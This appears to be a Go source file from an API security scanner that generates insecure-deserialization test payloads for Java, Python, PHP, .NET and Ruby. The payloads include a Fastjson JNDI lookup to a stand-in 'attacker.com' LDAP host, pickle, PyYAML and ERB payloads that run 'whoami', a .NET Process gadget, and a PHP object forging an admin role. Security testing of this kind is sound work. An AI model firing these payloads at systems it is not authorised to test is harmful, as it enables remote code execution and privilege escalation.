package payloads

import (
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// DeserializationGenerator generates Insecure Deserialization attack payloads
type DeserializationGenerator struct{}

// NewDeserializationGenerator creates a new Deserialization payload generator
func NewDeserializationGenerator() *DeserializationGenerator {
	return &DeserializationGenerator{}
}

// Type returns the attack type
func (g *DeserializationGenerator) Type() string {
	return types.AttackDeserialization
}

// Generate generates deserialization payloads for a parameter
func (g *DeserializationGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	if !g.isDeserializationRelevant(param, endpoint) {
		return payloads
	}

	payloads = append(payloads, g.javaPayloads()...)
	payloads = append(payloads, g.pythonPayloads()...)
	payloads = append(payloads, g.phpPayloads()...)
	payloads = append(payloads, g.dotNetPayloads()...)
	payloads = append(payloads, g.rubyPayloads()...)

	return payloads
}

// isDeserializationRelevant checks if parameter or endpoint is relevant for deserialization attacks
func (g *DeserializationGenerator) isDeserializationRelevant(param *types.Parameter, endpoint types.Endpoint) bool {
	nameLower := strings.ToLower(param.Name)
	pathLower := strings.ToLower(endpoint.Path)

	// Deserialization-related parameter names
	paramPatterns := []string{
		"data", "object", "serialized", "payload", "token",
		"session", "state", "viewstate", "base64", "encoded",
		"import", "upload", "transfer", "process", "load",
		"transform", "input",
	}

	for _, pattern := range paramPatterns {
		if strings.Contains(nameLower, pattern) {
			return true
		}
	}

	// Deserialization-related endpoints
	endpointPatterns := []string{
		"/import", "/upload", "/deserialize", "/load",
		"/transform", "/process", "/decode", "/convert",
		"/migrate",
	}

	for _, ep := range endpointPatterns {
		if strings.Contains(pathLower, ep) {
			return true
		}
	}

	// Methods that accept request bodies
	methodUpper := strings.ToUpper(endpoint.Method)
	if methodUpper == "POST" || methodUpper == "PUT" || methodUpper == "PATCH" {
		return true
	}

	// Parameter type containing object or binary
	typeLower := strings.ToLower(param.Type)
	if strings.Contains(typeLower, "object") || strings.Contains(typeLower, "binary") {
		return true
	}

	return false
}

// javaPayloads generates Java deserialization attack payloads
func (g *DeserializationGenerator) javaPayloads() []Payload {
	return []Payload{
		{
			Value:       "rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ",
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "Java: Base64 ObjectInputStream magic bytes (aced0005)",
			Metadata: map[string]string{
				"language": "java",
			},
		},
		{
			Value:       `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/obj"}`,
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "Java: Fastjson JNDI lookup via JdbcRowSetImpl",
			Metadata: map[string]string{
				"language": "java",
			},
		},
		{
			Value:       "org.apache.commons.collections.functors.InvokerTransformer",
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "Java: Commons Collections InvokerTransformer gadget class",
			Metadata: map[string]string{
				"language": "java",
			},
		},
	}
}

// pythonPayloads generates Python deserialization attack payloads
func (g *DeserializationGenerator) pythonPayloads() []Payload {
	return []Payload{
		{
			Value:       "gASVIAAAAA",
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "Python: Base64 pickle header bytes",
			Metadata: map[string]string{
				"language": "python",
			},
		},
		{
			Value:       "cos\nsystem\n(S'whoami'\ntR.",
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "Python: Pickle RCE via os.system",
			Metadata: map[string]string{
				"language": "python",
			},
		},
		{
			Value:       "!!python/object/apply:os.system ['whoami']",
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "Python: YAML deserialization RCE via PyYAML",
			Metadata: map[string]string{
				"language": "python",
			},
		},
	}
}

// phpPayloads generates PHP deserialization attack payloads
func (g *DeserializationGenerator) phpPayloads() []Payload {
	return []Payload{
		{
			Value:       `O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}`,
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "PHP: Serialized object with privilege escalation",
			Metadata: map[string]string{
				"language": "php",
			},
		},
		{
			Value:       `a:1:{s:4:"test";O:4:"User":1:{s:4:"role";s:5:"admin";}}`,
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "PHP: Nested serialized object in array",
			Metadata: map[string]string{
				"language": "php",
			},
		},
		{
			Value:       "phar://evil.phar",
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "PHP: Phar deserialization via phar:// stream wrapper",
			Metadata: map[string]string{
				"language": "php",
			},
		},
	}
}

// dotNetPayloads generates .NET deserialization attack payloads
func (g *DeserializationGenerator) dotNetPayloads() []Payload {
	return []Payload{
		{
			Value:       "AAEAAAD/////",
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: ".NET: Base64 BinaryFormatter magic bytes",
			Metadata: map[string]string{
				"language": "dotnet",
			},
		},
		{
			Value:       `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}`,
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: ".NET: TypeNameHandling RCE via ObjectDataProvider",
			Metadata: map[string]string{
				"language": "dotnet",
			},
		},
	}
}

// rubyPayloads generates Ruby deserialization attack payloads
func (g *DeserializationGenerator) rubyPayloads() []Payload {
	return []Payload{
		{
			Value:       "BAhv",
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "Ruby: Base64 Marshal format marker",
			Metadata: map[string]string{
				"language": "ruby",
			},
		},
		{
			Value:       "<%= system('whoami') %>",
			Type:        types.AttackDeserialization,
			Category:    "deserialization",
			Description: "Ruby: ERB template command execution",
			Metadata: map[string]string{
				"language": "ruby",
			},
		},
	}
}
